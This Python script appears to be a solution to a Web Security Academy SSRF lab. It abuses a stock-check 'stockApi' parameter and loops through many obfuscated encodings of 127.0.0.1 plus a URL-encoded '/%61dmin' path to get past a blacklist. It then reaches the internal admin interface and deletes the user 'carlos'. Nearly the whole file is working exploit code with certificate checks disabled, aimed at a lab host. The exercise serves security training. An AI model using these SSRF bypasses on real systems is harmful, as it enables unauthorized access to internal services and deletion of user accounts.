import http.client
import ssl
import urllib.parse

LAB_ID = "???"


def POST_product_stock(
        stockApi: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/product/stock'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'te': 'trailers',
    }
    fields = {
        'stockApi': stockApi,
    }
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


internal_ips = [  # got from https://github.com/vysecurity/IPFuscator
    '127.0.0.1',
    '127.1',
    '2130706433',
    '0x7f000001',
    '017700000001',
    '0x7f.0x0.0x0.0x1',
    '0177.00.00.01',
    '0x0000000000000000000000007f.0x000.0x0000000.0x000000000000000000001',
    '000177.000000000000000000000.00000000000000000.000000000000001',
    '0177.0.0.01',
    '127.0x0.0x0.1',
    '0177.00.00.0x1',
    '0177.0x0.0.01',
    '127.0x0.0.1',
    '0x0000000000000000000007f.0.0.1',
    '127.0.0.0000000000000000000000000000001',
    '000000000000177.0x0000000000000000000000000.000000.0001',
    '0x0000000000000000007f.0x0000000000000.0000000000000000000.1',

    'spoofed.burpcollaborator.net',
]
response = None
internal_ip = None
response = None
for internal_ip in internal_ips:
    print()
    print(f"trying internal ip: {internal_ip}")
    response = POST_product_stock(f'http://{internal_ip}/%61dmin')
    print(f"response: {response.status}")
    for header, value in response.headers.items():
        print(f"{header}: {value}")
    print(response.read().decode())
    if response.status not in [400, 421, 500]:
        print(f"found internal ip representation: {internal_ip}")
        break
else:
    print("could not find admin interface ip representation")
    exit(1)


print("admin interface:")
print(f"status: {response.status}")
for header, value in response.headers.items():
    print(f"{header}: {value}")

delete_path = "/%61dmin/delete?username=carlos"
response = POST_product_stock(f'http://{internal_ip}{delete_path}')
if response.status == 200:
    print("deleted user carlos")
